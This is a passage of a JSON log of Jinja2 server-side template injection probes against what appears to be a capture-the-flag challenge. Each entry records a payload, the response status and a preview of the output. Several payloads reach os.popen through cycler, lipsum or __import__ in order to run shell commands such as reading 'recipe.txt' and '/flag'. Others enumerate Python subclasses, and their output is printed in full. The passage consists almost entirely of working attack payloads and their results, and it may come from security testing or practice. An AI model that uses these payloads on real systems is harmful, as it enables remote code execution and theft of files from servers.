'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'BaseExceptionGroup': <class 'BaseExceptionGroup'>, 'Exception': <class 'Exception'>, 'GeneratorExit': <class 'GeneratorExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'SystemExit': <class 'SystemExit'>, 'ArithmeticError': <class 'ArithmeticError'>, 'AssertionError': <class 'AssertionError'>, 'AttributeError': <class 'AttributeError'>, 'BufferError': <class 'BufferError'>, 'EOFError': <class 'EOFError'>, 'ImportError': <class 'ImportError'>, 'LookupError': <class 'LookupError'>, 'MemoryError': <class 'MemoryError'>, 'NameError': <class 'NameError'>, 'OSError': <class 'OSError'>, 'ReferenceError': <class 'ReferenceError'>, 'RuntimeError': <class 'RuntimeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'SyntaxError': <class 'SyntaxError'>, 'SystemError': <class 'SystemError'>, 'TypeError': <class 'TypeError'>, 'ValueError': <class 'ValueError'>, 'Warning': <class 'Warning'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'BytesWarning': <class 'BytesWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'EncodingWarning': <class 'EncodingWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'UserWarning': <class 'UserWarning'>, 'BlockingIOError': <class 'BlockingIOError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionError': <class 'ConnectionError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'InterruptedError': <class 'InterruptedError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'IndentationError': <class 'IndentationError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'RecursionError': <class 'RecursionError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'UnicodeError': <class 'UnicodeError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'TabError': <class 'TabError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'ExceptionGroup': <class 'ExceptionGroup'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2023 Python Software Foundation.\nAll Rights Reserved.\n\nCopyright (c) 2000 BeOpen.com.\nAll Rights Reserved.\n\nCopyright (c) 1995-2001 Corporation for National Research Initiatives.\nAll Rights Reserved.\n\nCopyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.\nAll Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen, Zope Corporation, the Python Software\n    Foundation, and a cast of thousands for supporting Python\n    development.  See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, '__annotations__': {'missing': typing.Any, 'internal_code': typing.MutableSet[code]}, 'enum': <module 'enum' from '/usr/local/lib/python3.12/enum.py'>, 'json': <module 'json' from '/usr/local/lib/python3.12/json/__init__.py'>, 'os': <module 'os' (frozen)>, 're': <module 're' from '/usr/local/lib/python3.12/re/__init__.py'>, 't': <module 'typing' from '/usr/local/lib/python3.12/typing.py'>, 'abc': <module 'collections.abc' from '/usr/local/lib/python3.12/collections/abc.py'>, 'deque': <class 'collections.deque'>, 'choice': <bound method Random.choice of <random.Random object at 0x5584c12e7c20>>, 'randrange': <bound method Random.randrange of <random.Random object at 0x5584c12e7c20>>, 'Lock': <built-in function allocate_lock>, 'CodeType': <class 'code'>, 'quote_from_bytes': <function quote_from_bytes at 0x7f6c9d886a20>, 'markupsafe': <module 'markupsafe' from '/usr/local/lib/python3.12/site-packages/markupsafe/__init__.py'>, 'F': ~F, 'missing': missing, 'internal_code': {<code object __call__ at 0x7f6c9ca8d430, file \"/usr/local/lib/python3.12/site-packages/jinja2/runtime.py\", line 571>, <code object __getattr__ at 0x7f6c9cacc8b0, file \"/usr/local/lib/python3.12/site-packages/jinja2/runtime.py\", line 859>, <code object load at 0x7f6c9cc0d920, file \"/usr/local/lib/python3.12/site-packages/jinja2/loaders.py\", line 516>, <code object select_template at 0x7f6c9d70ead0, file \"/usr/local/lib/python3.12/site-packages/jinja2/environment.py\", line 1015>, <code object _get_default_module at 0x5584c132f960, file \"/usr/local/lib/python3.12/site-packages/jinja2/environment.py\", line 1428>, <code object compile at 0x7f6c9d6b3830, file \"/usr/local/lib/python3.12/site-packages/jinja2/environment.py\", line 728>, <code object get_or_select_template at 0x7f6c9cb68870, file \"/usr/local/lib/python3.12/site-packages/jinja2/environment.py\", line 1069>, <code object __call__ at 0x7f6c9ca48d50, file \"/usr/local/lib/python3.12/site-packages/jinja2/runtime.py\", line 379>, <code object get_template at 0x7f6c9cb6c2b0, file \"/usr/local/lib/python3.12/site-packages/jinja2/environment.py\", line 978>, <code object __call__ at 0x5584c14ef190, file \"/usr/local/lib/python3.12/site-packages/jinja2/runtime.py\", line 692>, <code object load at 0x7f6c9cc0e4f0, file \"/usr/local/lib/python3.12/site-packages/jinja2/loaders.py\", line 566>, <code object call at 0x5584c14fcbe0, file \"/usr/local/lib/python3.12/site-packages/jinja2/runtime.py\", line 262>, <code object parse at 0x7f6c9d6ff340, file \"/usr/local/lib/python3.12/site-packages/jinja2/environment.py\", line 595>, <code object load at 0x5584c14e9c10, file \"/usr/local/lib/python3.12/site-packages/jinja2/loaders.py\", line 107>, <code object _async_call at 0x7f6c9cbd5df0, file \"/usr/local/lib/python3.12/site-packages/jinja2/runtime.py\", line 368>, <code object _load_template at 0x5584c145a680, file \"/usr/local/lib/python3.12/site-packages/jinja2/environment.py\", line 953>, <code object _fail_with_undefined_error at 0x7f6c9ca5ec30, file \"/usr/local/lib/python3.12/site-packages/jinja2/runtime.py\", line 850>, <code object load at 0x5584c14dd620, file \"/usr/local/lib/python3.12/site-packages/jinja2/loaders.py\", line 641>}, 'concat': <built-in method join of str object at 0x7f6c9e462270>, 'pass_context': <function pass_context at 0x7f6c9ca34e00>, 'pass_eval_context': <function pass_eval_context at 0x7f6c9ca35f80>, 'pass_environment': <function pass_environment at 0x7f6c9ca36020>, '_PassArg': <enum '_PassArg'>, 'internalcode': <function internalcode at 0x7f6c9ca360c0>, 'is_undefined': <function is_undefined at 0x7f6c9ca362a0>, 'consume': <function consume at 0x7f6c9ca36340>, 'clear_caches': <function clear_caches at 0x7f6c9ca363e0>, 'import_string': <function import_string at 0x7f6c9ca36480>, 'open_if_exists': <function open_if_exists at 0x7f6c9ca36520>, 'object_type_repr': <function object_type_repr at 0x7f6c9ca365c0>, 'pformat': <function pformat at 0x7f6c9ca36660>, '_http_re': re.compile('\\n    ^\\n    (\\n        (https?://|www\\\\.)  # scheme or www\\n        (([\\\\w%-]+\\\\.)+)?  # subdomain\\n        (\\n            [a-z]{2,63}  # basic tld\\n        |\\n            xn--[\\\\w%]{2,59}  # idna t, re.IGNORECASE|re.VERBOSE), '_email_re': re.compile('^\\\\S+@\\\\w[\\\\w.-]*\\\\.\\\\w+$'), 'urlize': <function urlize at 0x7f6c9ca36700>, 'generate_lorem_ipsum': <function generate_lorem_ipsum at 0x7f6c9ca367a0>, 'url_quote': <function url_quote at 0x7f6c9ca36840>, 'LRUCache': <class 'jinja2.utils.LRUCache'>, 'select_autoescape': <function select_autoescape at 0x7f6c9ca368e0>, 'htmlsafe_json_dumps': <function htmlsafe_json_dumps at 0x7f6c9ca37740>, 'Cycler': <class 'jinja2.utils.Cycler'>, 'Joiner': <class 'jinja2.utils.Joiner'>, 'Namespace': <class 'jinja2.utils.Namespace'>}",
+    "length": 13635,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.858,
+    "interesting": true,
+    "flags": [],
+    "index": 43
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_cycler_os",
+    "note": "{{cycler.__init__.__globals__.os.getcwd()}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "/challenge",
+    "length": 1409,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.856,
+    "interesting": true,
+    "flags": [],
+    "index": 44
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_cycler_popen",
+    "note": "{{cycler.__init__.__globals__.os.popen(\"cat recipe.txt\").read()}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "",
+    "length": 1399,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.861,
+    "interesting": false,
+    "flags": [],
+    "index": 45
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_lipsum_global",
+    "note": "{{lipsum.__globals__.os.popen(\"cat recipe.txt\").read()}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "",
+    "length": 1399,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.854,
+    "interesting": false,
+    "flags": [],
+    "index": 46
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_subprocess",
+    "note": "{{\"\".__class__.__mro__[1].__subclasses__()}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'int'>, <class 'map'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'zip'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class '_buffer_wrapper'>, <class 'Token.MISSING'>, <class 'coroutine_wrapper'>, <class 'generic_alias_iterator'>, <class 'items'>, <class 'keys'>, <class 'values'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'hamt'>, <class 'sys.legacy_event_handler'>, <class 'InterpreterID'>, <class 'line_iterator'>, <class 'managedbuffer'>, <class 'memory_iterator'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'positions_iterator'>, <class 'str_ascii_iterator'>, <class 'types.UnionType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'typing.TypeAliasType'>, <class 'typing.Generic'>, <class 'typing.TypeVar'>, <class 'typing.TypeVarTuple'>, <class 'typing.ParamSpec'>, <class 'typing.ParamSpecArgs'>, <class 'typing.ParamSpecKwargs'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class '_frozen_importlib._WeakValueDictionary'>, <class '_frozen_importlib._BlockingOnManager'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io.IncrementalNewlineDecoder'>, <class '_io._BytesIOBuffer'>, <class '_io._IOBase'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Buffer'>, <class 'collections.abc.Callable'>, <class 'genericpath.ALLOW_MISSING'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.batched'>, <class 'itertools.chain'>, <class 'itertools.combinations'>, <class 'itertools.compress'>, <class 'itertools.count'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.filterfalse'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools.islice'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.starmap'>, <class 'itertools.takewhile'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'itertools.zip_longest'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class 'collections._deque_iterator'>, <class 'collections._deque_reverse_iterator'>, <class 'collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'enum.nonmember'>, <class 'enum.member'>, <class 'enum._not_given'>, <class 'enum._auto_null'>, <class 'enum.auto'>, <class 'enum._proto_member'>, <enum 'Enum'>, <class 'enum.verify'>, <class 'ast.AST'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'datetime.date'>, <class 'datetime.time'>, <class 'datetime.timedelta'>, <class 'datetime.tzinfo'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class '_sre.SRE_Template'>, <class 're._parser.State'>, <class 're._parser.SubPattern'>, <class 're._parser.Tokenizer'>, <class 're.Scanner'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_random.Random'>, <class '_sha2.SHA224Type'>, <class '_sha2.SHA256Type'>, <class '_sha2.SHA384Type'>, <class '_sha2.SHA512Type'>, <class '_socket.socket'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class 'socket.AddressFamily'>, <class 'array.array'>, <class 'array.arrayiterator'>, <class 'ipaddress._IPAddressBase'>, <class 'ipaddress._BaseConstants'>, <class 'ipaddress._BaseV4'>, <class 'ipaddress._IPv4Constants'>, <class 'ipaddress._BaseV6'>, <class 'ipaddress._IPv6Constants'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class '_struct.Struct'>, <class '_struct.unpack_iterator'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.SSLSession'>, <class '_ssl.Certificate'>, <class 'ssl.SSLObject'>, <class 'mimetypes.MimeTypes'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class 'zlib._ZlibDecompressor'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver._NoThreads'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class '_pickle.Pickler'>, <class '_pickle.Unpickler'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.TemporaryDirectory'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'typing._Final'>, <class 'typing._NotIterable'>, typing.Any, <class 'typing._PickleUsingNameMixin'>, <class 'typing._TypingEllipsis'>, <class 'typing.Annotated'>, <class 'typing.NamedTuple'>, <class 'typing.TypedDict'>, <class 'typing.NewType'>, <class 'typing.io'>, <class 'typing.re'>, <class '_hashlib.HASH'>, <class '_hashlib.HMAC'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class '__future__._Feature'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'ast.NodeVisitor'>, <class 'dis._Unknown'>, <class 'dis.Bytecode'>, <class '_tokenize.TokenizerIter'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'numbers.Number'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'importlib._abc.Loader'>, <class 'importlib.util._incompatible_extension_module_restrictions'>, <class 'jinja2.loaders.BaseLoader'>, <class 'unicodedata.UCD'>, <class 'textwrap.TextWrapper'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback._ExceptionPrintContext'>, <class 'traceback.TracebackException'>, <class 'signal.Signals'>, <class 'signal.Handlers'>, <class 'signal.Sigmasks'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]",
+    "length": 13201,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.845,
+    "interesting": true,
+    "flags": [],
+    "index": 47
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_filter_upper",
+    "note": "{{\"hello\"|upper}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "HELLO",
+    "length": 1404,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.866,
+    "interesting": true,
+    "flags": [],
+    "index": 48
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_filter_attr",
+    "note": "{{\"\"|attr(\"__class__\")}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "<class 'str'>",
+    "length": 1412,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.857,
+    "interesting": true,
+    "flags": [],
+    "index": 49
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_include",
+    "note": "{% include \"recipe.txt\" %}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.353,
+    "interesting": false,
+    "flags": [],
+    "index": 50
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_for",
+    "note": "{% for x in [1,2,3] %}{{x}}{% endfor %}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "123",
+    "length": 1402,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.846,
+    "interesting": true,
+    "flags": [],
+    "index": 51
+  },
+  {
+    "kind": "engine",
+    "label": "python_format_read",
+    "note": "{{\"{0.__class__}\".format(5)}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "<class 'int'>",
+    "length": 1412,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.845,
+    "interesting": true,
+    "flags": [],
+    "index": 52
+  },
+  {
+    "kind": "engine",
+    "label": "python_format_get",
+    "note": "{{\"{0.__class__.__mro__}\".format(5)}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "(<class 'int'>, <class 'object'>)",
+    "length": 1432,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.855,
+    "interesting": true,
+    "flags": [],
+    "index": 53
+  },
+  {
+    "kind": "engine",
+    "label": "python_index_list",
+    "note": "{{[\"a\",\"b\"][1]}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "b",
+    "length": 1400,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.845,
+    "interesting": true,
+    "flags": [],
+    "index": 54
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_index_expr",
+    "note": "{{()[0]}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "",
+    "length": 1399,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.856,
+    "interesting": false,
+    "flags": [],
+    "index": 55
+  },
+  {
+    "kind": "engine",
+    "label": "unicode_test",
+    "note": "{{\"test\\u002fpath\"}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "test/path",
+    "length": 1408,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.861,
+    "interesting": true,
+    "flags": [],
+    "index": 56
+  },
+  {
+    "kind": "engine",
+    "label": "format_shell",
+    "note": "{{__import__(\"os\").popen(\"cat /flag\").read()}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.371,
+    "interesting": false,
+    "flags": [],
+    "index": 57
+  }
+]
